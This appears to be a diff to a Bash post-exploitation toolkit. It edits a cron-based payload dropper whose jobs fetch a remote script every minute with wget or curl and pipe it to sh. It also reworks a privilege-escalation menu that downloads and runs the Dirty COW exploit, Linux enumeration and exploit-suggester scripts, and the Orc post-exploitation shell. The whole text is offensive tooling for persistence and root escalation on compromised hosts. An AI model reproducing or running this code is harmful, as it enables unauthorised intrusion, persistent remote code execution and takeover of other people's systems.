@@ -127,10 +127,11 @@ lswrap(){
 
 cron(){
 	read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
+	read -r -p "Enter name of payload to be executed: " payload
 	read -r -p "Would you like to use wget to download/execute or curl to download/execute in memory for cronjob?: " wc
 	case $wc in
 		[WGETwget]* )
-			cronjob="* * * * * wget -O- $server | sh";;
+			cronjob="* * * * * wget $server ; sh $payload";;
 		[CURLcurl]* )
 			cronjob="* * * * * curl -fsSL '$server' | sh";;
 	esac
@@ -231,47 +232,52 @@ escalate(){
 	downld(){
 		wget -P ${direct} $1 2>/dev/null
 		chmod +x ${direct}/*
+
+		if echo $1 | grep .py; then
+			python ${direct}/./*
+		elif echo $1 | grep .sh; then
+			${direct}/./*
+		elif echo $1 | grep .zip; then
+			unzip -q ${direct}/master.zip -d ${direct}/Orc
+
+			cat <<-EOF
+
+				Dropping into Orc shell!
+
+				Check https://github.com/zMarch/Orc for commands and usage.
+
+				EOF
+
+			ENV=${direct}/Orc/Orc-master/o.rc sh -i
+		else
+			gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
+			${direct}/./dirty
+		fi
 	}
 
 	dirty(){
 		echo -e "This may take some time...\n"
 		downld https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
-		gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
-		${direct}/./dirty
 	}
 
 
 	linprivesc(){
 		downld https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-		python ${direct}/./linuxprivchecker.py
 	}
 
 
 	exploitsug(){
 		downld https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-		${direct}/./linux-exploit-suggester.sh
 	}
 
 
 	lineum(){
 		downld https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-		${direct}/./LinEnum.sh
 	}
 
 
 	Orc(){
 		downld https://github.com/zMarch/Orc/archive/master.zip
-		unzip -q ${direct}/master.zip -d ${direct}/Orc
-
-		cat <<-EOF
-
-			Dropping into Orc shell!
-
-			Check https://github.com/zMarch/Orc for commands and usage.
-
-			EOF
-
-		ENV=${direct}/Orc/Orc-master/o.rc sh -i
 	}
 
 	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run Orc" "Return to main menu")
@@ -290,10 +296,10 @@ escalate(){
 	
 	rm -rf ${direct}
 
-	if (("$REPLY" == 7)); then
-		return
-	else
+	if [ "$REPLY" -ge 1 -a "$REPLY" -le 6 ]; then
 		enter
+	else
+		return
 	fi
 }
 
